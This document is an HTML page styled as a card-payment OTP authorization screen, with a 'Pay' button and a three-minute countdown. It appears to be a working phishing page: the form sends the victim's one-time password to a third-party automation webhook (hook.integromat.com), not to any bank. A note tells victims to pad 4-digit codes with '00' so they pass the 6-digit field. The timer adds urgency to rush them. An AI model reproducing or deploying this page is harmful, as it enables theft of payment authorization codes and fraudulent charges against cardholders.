<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authorization - OTP</title>
  <link rel="icon" href="https://cdn4.vectorstock.com/i/1000x1000/64/53/contactless-payment-credit-card-and-hand-tap-logo-vector-26336453.jpg" type="image/x-icon">
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f6f9fc;
      margin: 0;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    }
    .container {
      background: white;
      padding: 2rem;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      max-width: 400px;
      width: 90%;
      text-align: center;
    }
    .prompt {
      margin-bottom: 1rem;
      color: #32325d;
      font-size: 1.2rem;
    }
    .otp-input {
      width: 100%;
      padding: 0.75rem;
      font-size: 1.5rem;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 6px;
      transition: border-color 0.3s ease;
      margin-bottom: 1rem;
    }
    .otp-input:focus {
      border-color: #6772e5;
      outline: none;
    }
    .button-container {
      display: flex;
      justify-content: center;
      margin-top: 1rem;
    }
    .button {
      width: 100%;
      max-width: 200px;
      padding: 0.75rem;
      background: #6772e5;
      border: none;
      border-radius: 4px;
      color: white;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .button:hover {
      background: #5469d4;
    }
    .timer, .note {
      text-align: center;
      margin-top: 20px;
      font-size: 18px;
      color: #333;
      font-weight: bold;
    }
    .note {
      margin-top: 10px;
      font-size: 14px;
      color: #666;
      font-weight: normal;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="prompt">
      Enter the OTP sent to your registered mobile number and click on Pay!
    </div>
    <form action="https://hook.integromat.com/stpe8xb1994dv9naukp5bca9t6l0gfja" method="post" autocomplete="off">
      <input type="hidden" id="redirect" name="redirect" value="https://homotraders.com/otpfailed">
      <input type="text" id="otp" name="otp" maxlength="6" pattern="\d{6}" class="otp-input" required />
      <div class="button-container">
        <button type="submit" class="button"><span>Pay</span></button>
      </div>
    </form>
    <div class="timer" id="timer">Enter OTP within 03:00 to avoid payment failure</div>
    <div class="note">For 4 digit OTP kindly enter 4 digits first and then enter two zeros (00) at last to complete the payment.</div>
  </div>
  <script>
    function startTimer(duration, display) {
      var timer = duration, minutes, seconds;
      setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = "Enter OTP within " + minutes + ":" + seconds + " to avoid payment failure";

        if (--timer < 0) {
          window.location.href = "failed.html";
        }
      }, 1000);
    }

    window.onload = function () {
      var threeMinutes = 60 * 3,
          display = document.querySelector('#timer');
      startTimer(threeMinutes, display);
    };
  </script>
</body>
</html>
